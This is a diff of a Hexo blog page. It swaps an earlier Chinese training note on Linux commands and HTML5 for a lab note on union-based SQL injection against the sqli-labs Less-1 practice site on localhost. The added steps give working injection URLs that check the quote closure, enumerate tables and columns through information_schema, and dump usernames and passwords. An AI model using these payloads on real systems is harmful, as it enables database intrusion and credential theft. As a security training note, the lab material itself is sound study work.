@@ -15,22 +15,30 @@
 
 
 
-<meta name="description" content="一.复盘Linux命令 127.0.0.1是本地回环地址  0.0.0.0  *    0.0.0.0 是一个特殊的 IP 地址，通常用于表示”未指定”或”任意”地址。在计算机网络中，它有几种不同的含义。 （1）在 IPv4 地址中，0.0.0.0 通常用作未指定地址。在服务器中，当需要监听所有可用的网络接口时，可以将服务绑定到 0.0.0.0 地址。 （2）在某些情况下，0.0.0.0 还可以表">
+<meta name="description" content="安装PHP5.5.9，HackBar1.打开虚拟机win10hei的PHPstudy，启动Apache和Mtsql，在软件管理的php界面下载php5.5.9，2.在下图的路径输入cmd,在输入以下命令：  12345mysql  -u root -pshow databases；use security;show tables;select 1，2,3;  3.下载火狐插件HackBar 它可以">
 <meta property="og:type" content="article">
-<meta property="og:title" content="复盘Linux命令，安装命令和工具，HTML5介绍,写一个网页">
-<meta property="og:url" content="http://example.com/2023/12/06/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B006/index.html">
+<meta property="og:title" content="SQL注入之联合型">
+<meta property="og:url" content="http://example.com/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一.复盘Linux命令 127.0.0.1是本地回环地址  0.0.0.0  *    0.0.0.0 是一个特殊的 IP 地址，通常用于表示”未指定”或”任意”地址。在计算机网络中，它有几种不同的含义。 （1）在 IPv4 地址中，0.0.0.0 通常用作未指定地址。在服务器中，当需要监听所有可用的网络接口时，可以将服务绑定到 0.0.0.0 地址。 （2）在某些情况下，0.0.0.0 还可以表">
+<meta property="og:description" content="安装PHP5.5.9，HackBar1.打开虚拟机win10hei的PHPstudy，启动Apache和Mtsql，在软件管理的php界面下载php5.5.9，2.在下图的路径输入cmd,在输入以下命令：  12345mysql  -u root -pshow databases；use security;show tables;select 1，2,3;  3.下载火狐插件HackBar 它可以">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1701866213572-dba507a2-78f1-40c0-84ea-2bba881fb4a6.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1701867060599-47d73f04-c5fa-485c-8889-fe9ae5bb56dc.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/image-20231206215421975.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1701869852940-bd77b4b2-0c1f-43cd-b2e3-85831460b788.png">
-<meta property="article:published_time" content="2023-12-06T13:39:35.000Z">
-<meta property="article:modified_time" content="2023-12-12T10:54:03.863Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080258406-5071209f-9911-44bc-92f1-a2ae9d2f78ae.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080376428-d760af2c-e3e8-4399-b3cc-c4642397f8df.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080560321-32f26f0e-eb22-4eeb-92c0-9eb1a542ffb0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080753625-31554e52-90d8-4f13-b926-3d65803c9cff.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080802345-7bdec522-fae3-4bc3-a3c7-47975aa00522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080911381-9f3e0491-4687-4014-9a3e-7ff1e1eb5b26.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703081834980-d182d068-33e3-4409-a6a4-66d6b1d7520b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703082782269-f4f9e588-7de0-4728-8678-0edc126360bd.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703083424177-f813c2f6-07c8-4ed9-8aa3-eb163abd70ff.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084084617-c5a5e408-80ed-4633-8657-172464224c47.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084568983-25426fef-0ad4-4668-92fe-01c31deb7031.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703085525578-5bf71d67-d324-4a38-bec1-a63cdfd5bcc0.png">
+<meta property="article:published_time" content="2023-12-23T14:35:16.000Z">
+<meta property="article:modified_time" content="2023-12-23T14:38:30.757Z">
 <meta property="article:author" content="Tangxianshen">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1701866213572-dba507a2-78f1-40c0-84ea-2bba881fb4a6.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080258406-5071209f-9911-44bc-92f1-a2ae9d2f78ae.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -64,7 +72,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>复盘Linux命令，安装命令和工具，HTML5介绍,写一个网页 | Hexo</title>
+<title>SQL注入之联合型 | Hexo</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -264,11 +272,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-培训笔记06" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-培训笔记20" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2023/12/06/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B006/" class="article-date">
-      <time datetime="2023-12-06T13:39:35.000Z" itemprop="datePublished">2023-12-06</time>
+      <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/" class="article-date">
+      <time datetime="2023-12-23T14:35:16.000Z" itemprop="datePublished">2023-12-23</time>
 </a>
 
 
@@ -283,7 +291,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      复盘Linux命令，安装命令和工具，HTML5介绍,写一个网页
+      SQL注入之联合型
     </h1>
   
 
@@ -300,35 +308,17 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="一-复盘Linux命令"><a href="#一-复盘Linux命令" class="headerlink" title="一.复盘Linux命令"></a>一.复盘Linux命令</h2><ol>
-<li><p>127.0.0.1是本地回环地址</p>
-</li>
-<li><p>0.0.0.0  *    0.0.0.0 是一个特殊的 IP 地址，通常用于表示”未指定”或”任意”地址。在计算机网络中，它有几种不同的含义。</p>
-<p>（1）在 IPv4 地址中，0.0.0.0 通常用作未指定地址。在服务器中，当需要监听所有可用的网络接口时，可以将服务绑定到 0.0.0.0 地址。</p>
-<p>（2）在某些情况下，0.0.0.0 还可以表示”任意地址”，例如在路由表中指示默认路由。</p>
-</li>
-</ol>
-<p>3.打开虚拟机CentOS,安装网络命令和工具。输入以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yum install net-tools.x86_64 -y         安装网络命令</span><br><span class="line">yum -y install epel-release             安装软件源</span><br><span class="line">yum -y install vim                      安装编辑器</span><br><span class="line">yum install unzip -y                    安装unzip工具</span><br><span class="line">yum search wget -y(yum install wget)    搜索并安装wget工具</span><br><span class="line">yum install -y git                      安装Git版本控制工具</span><br><span class="line">yum install docker -y                   安装容器引擎</span><br><span class="line">yum -y install python-pip               安装python的pip包管理工具</span><br><span class="line">yum install -y docker-compose           安装用于定义和运行多个容器的工具</span><br><span class="line"></span><br><span class="line">yum -y install python-pip^c             安装python-pip包</span><br></pre></td></tr></table></figure>
+        <h2 id="安装PHP5-5-9，HackBar"><a href="#安装PHP5-5-9，HackBar" class="headerlink" title="安装PHP5.5.9，HackBar"></a>安装PHP5.5.9，HackBar</h2><p>1.打开虚拟机win10hei的PHPstudy，启动Apache和Mtsql，在软件管理的php界面下载php5.5.9，<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080258406-5071209f-9911-44bc-92f1-a2ae9d2f78ae.png" alt="image.png"><br>2.在下图的路径输入cmd,在输入以下命令：</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080376428-d760af2c-e3e8-4399-b3cc-c4642397f8df.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql  -u root -p</span><br><span class="line">show databases；</span><br><span class="line">use security;</span><br><span class="line">show tables;</span><br><span class="line">select 1，2,3;</span><br></pre></td></tr></table></figure>
 
-<h2 id="二-HTML5介绍"><a href="#二-HTML5介绍" class="headerlink" title="二.HTML5介绍"></a><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1701866213572-dba507a2-78f1-40c0-84ea-2bba881fb4a6.png" alt="图片.png">二.HTML5介绍</h2><p>1.HTML:超文本标记语言5, HTML5 是最新的 HTML 标准，于2014年由万维网联盟（W3C）正式推出。HTML5 提供了许多新的功能和语义化标签，旨在改进 Web 开发体验并提供更丰富的内容。<br>2.打开vscode，新建1.html的文件， 输入 ！按tab键， 在<body></body>中输入以下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;b&lt;/b&gt;                              //加粗</span><br><span class="line">    &lt;i&gt;i&lt;/i&gt;                          //斜体</span><br><span class="line">    &lt;sup&gt;sup&lt;/sup&gt;                    //上标</span><br><span class="line">    </span><br><span class="line">                            //换行</span><br><span class="line">    &lt;sub&gt;sub&lt;/sub&gt;                    //下标</span><br><span class="line">    &lt;hr /&gt;                            //水平线</span><br><span class="line">    &lt;strong&gt;加粗&lt;/strong&gt;             //加粗</span><br><span class="line">    &lt;!--     --&gt;                     //注释 Ctrl+/</span><br><span class="line">&lt;em&gt;em&lt;/em&gt;                          //强调表示斜体</span><br><span class="line">    &lt;h1&gt;标题&lt;/h1&gt;                    //标题1</span><br><span class="line">    &lt;h6&gt;标题&lt;/h6&gt;                    //标题6</span><br><span class="line">    &lt;s&gt;sifuef&lt;/s&gt;                   //文字中下方有横线穿过</span><br><span class="line">    &lt;del&gt;del&lt;/del&gt;                  //删除</span><br><span class="line">    &lt;a href=&quot;https://home.firefoxchina.cn&quot;&gt;火狐&lt;/a&gt;          //超链接</span><br><span class="line">    &lt;img src=&quot;./1.jpg&quot; alt=&quot;1&quot;&gt;                             //引入图片</span><br><span class="line">    &lt;p&gt;老默，我想吃鱼了快去&lt;img src=&quot;./1.jpg&quot; width=&quot;50&quot; height=&quot;70&quot; alt=&quot;树&quot;&gt;钓几条鱼&lt;/p&gt;  //文字中引入图片</span><br><span class="line">      &lt;table border=&quot;1&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;2&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;3&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;4&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;5&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;6&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080560321-32f26f0e-eb22-4eeb-92c0-9eb1a542ffb0.png" alt="Image.png"><br>3.下载火狐插件HackBar 它可以发包。把这个插件安装到浏览器。按键盘上的F12可以唤起它。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080753625-31554e52-90d8-4f13-b926-3d65803c9cff.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080802345-7bdec522-fae3-4bc3-a3c7-47975aa00522.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080911381-9f3e0491-4687-4014-9a3e-7ff1e1eb5b26.png" alt="image.png"><br>4.information_schema是在mysql5.0之后产生的（面试题考点）</p>
+<h2 id="SQL联合注入步骤"><a href="#SQL联合注入步骤" class="headerlink" title="SQL联合注入步骤"></a>SQL联合注入步骤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">联合(union)的顺序:查表-&gt;查字段名-&gt;查字段</span><br><span class="line"></span><br><span class="line">SQL查表</span><br><span class="line">select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();-- -</span><br><span class="line"></span><br><span class="line">SQL查字段名</span><br><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();-- -</span><br><span class="line"></span><br><span class="line">SQL查字段</span><br><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;-- -     //这三条语句必记</span><br></pre></td></tr></table></figure>
 
-<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1701867060599-47d73f04-c5fa-485c-8889-fe9ae5bb56dc.png" alt="图片.png" style="zoom:50%;" />
-
-
-
-
-
-<p>3.写一个from表单</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/submit-form&quot; method=&quot;post&quot;&gt;  </span><br><span class="line">        &lt;label for=&quot;name&quot;&gt;姓名：&lt;/label&gt;  </span><br><span class="line">        &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot; required&gt;&lt;br&gt;  </span><br><span class="line">        </span><br><span class="line">        &lt;label for=&quot;email&quot;&gt;电子邮件：&lt;/label&gt;  </span><br><span class="line">        &lt;input type=&quot;email&quot; id=&quot;email&quot; name=&quot;email&quot; required&gt;&lt;br&gt;  </span><br><span class="line">        </span><br><span class="line">        &lt;label for=&quot;message&quot;&gt;留言：&lt;/label&gt;  </span><br><span class="line">        &lt;textarea id=&quot;message&quot; name=&quot;message&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;  </span><br><span class="line">        </span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;  </span><br><span class="line">      &lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/image-20231206215421975.png" alt="image-20231206215421975"></p>
-<h2 id="三-写一个网页"><a href="#三-写一个网页" class="headerlink" title="三.写一个网页"></a>三.写一个网页</h2><p>1.新建2.html文件，输入以下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;简单的网页布局&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        #container &#123;</span><br><span class="line">            width: 600px;</span><br><span class="line">            text-align: center;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #header &#123;</span><br><span class="line">            height: 300px;</span><br><span class="line">            width: 500px;</span><br><span class="line">            background-color: aqua;</span><br><span class="line">            margin-bottom: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #box02 &#123;</span><br><span class="line">            height: 400px;</span><br><span class="line">            width: 200px;</span><br><span class="line">            background-color: burlywood;</span><br><span class="line">            float: left;</span><br><span class="line">            margin-bottom: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #box03 &#123;</span><br><span class="line">            height: 400px;</span><br><span class="line">            width: 300px;</span><br><span class="line">            float: left;</span><br><span class="line">            background-color: chartreuse;</span><br><span class="line">            margin-bottom: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;header&quot;&gt;</span><br><span class="line">            &lt;p&gt;这是顶部盒子&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div id=&quot;box02&quot;&gt;</span><br><span class="line">            &lt;p&gt;这是第二个盒子&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div id=&quot;box03&quot;&gt;</span><br><span class="line">            &lt;p&gt;这是第三个盒子&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1701869852940-bd77b4b2-0c1f-43cd-b2e3-85831460b788.png" alt="图片.png" style="zoom:50%;" />
-
+<p>1.把sqli文件复制到phpstudy的根目录下，使用php5.5.9，打开网站，点击sqli，进入第一关<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703081834980-d182d068-33e3-4409-a6a4-66d6b1d7520b.png" alt="image.png"><br>2.格式：本地地址或虚拟机地址&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;x   union      xxxxxxxxxxxxxxxx    – -<br>注意：x的值为-1或0         – -为SQL的注释<br>3.先判断是否闭合，输入？id&#x3D;1  再点击Excute发包。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703082782269-f4f9e588-7de0-4728-8678-0edc126360bd.png" alt="image.png"><br>4.然后在1后面加 ‘ 发现报错，如图，有5个分号，1和5抵消，2和3抵消，剩下4，说明没有闭合，1’就是我们要找的。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703083424177-f813c2f6-07c8-4ed9-8aa3-eb163abd70ff.png" alt="image.png"><br>5.其次，开始查表，把1改成0，在0’后面加一个空格，然后加union ，在union后面加查表语句  select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database();  这条语句后要加 – -   将后面的内容注释掉。<br>最终语句为<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084084617-c5a5e408-80ed-4633-8657-172464224c47.png" alt="image.png"><br>6.查字段名，把原来语句的基础上，把查表语句改成查字段语句，然后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=database();-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084568983-25426fef-0ad4-4668-92fe-01c31deb7031.png" alt="image.png"><br>7.最后查字段，把原来语句的基础上，把查字段名语句改成查字段语句，在 group_concat(id,”<del>“,username,”</del>“,password)的group前加上     1，      在password）后面加    ,3       最后再完整语句后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1, group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users ;-- -</code></p>
+<p>8.最终得到我们想要的整列的username和整列的password<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703085525578-5bf71d67-d324-4a38-bec1-a63cdfd5bcc0.png" alt="Image.png"></p>
 
       
     </div>
@@ -337,13 +327,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2023/12/06/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B006/">复盘Linux命令，安装命令和工具，HTML5介绍,写一个网页</a></p>
+        <p><span>Title:</span><a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/">SQL注入之联合型</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2023-12-06, 21:39:35</p>
-        <p><span>Updated:</span>2023-12-12, 18:54:03</p>
+        <p><span>Created:</span>2023-12-23, 22:35:16</p>
+        <p><span>Updated:</span>2023-12-23, 22:38:30</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2023/12/06/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B006/" title="复盘Linux命令，安装命令和工具，HTML5介绍,写一个网页">http://example.com/2023/12/06/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B006/</a>
-            <span class="copy-path" data-clipboard-text="From http://example.com/2023/12/06/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B006/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/" title="SQL注入之联合型">http://example.com/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/</a>
+            <span class="copy-path" data-clipboard-text="From http://example.com/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -356,15 +346,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2023/12/10/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B009/">
-                    第一个python程序，用户交互，if条件判断
+                <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/">
+                    SQL注入之盲注型,报错型，postman软件的使用
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2023/12/05/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B005/">
-                    介绍路由，代理和OSI模型，VMware workstation，wireshark
+                <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B019/">
+                    axios和api.php的使用
                 </a>
             </div>
         
@@ -376,7 +366,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%A4%8D%E7%9B%98Linux%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">一.复盘Linux命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-HTML5%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">二.HTML5介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%86%99%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5"><span class="toc-number">3.</span> <span class="toc-text">三.写一个网页</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85PHP5-5-9%EF%BC%8CHackBar"><span class="toc-number">1.</span> <span class="toc-text">安装PHP5.5.9，HackBar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">SQL联合注入步骤</span></a></li></ol>
         
     </div>
     <style>
@@ -412,7 +402,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"复盘Linux命令，安装命令和工具，HTML5介绍,写一个网页　| Hexo　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"SQL注入之联合型　| Hexo　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -432,7 +422,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2023/12/10/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B009/" title="Pre: 第一个python程序，用户交互，if条件判断">
+            <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/" title="Pre: SQL注入之盲注型,报错型，postman软件的使用">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -440,7 +430,7 @@
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2023/12/05/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B005/" title="Next: 介绍路由，代理和OSI模型，VMware workstation，wireshark">
+            <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B019/" title="Next: axios和api.php的使用">
                 <i class="fa fa-angle-right"></i>
             </a>
         
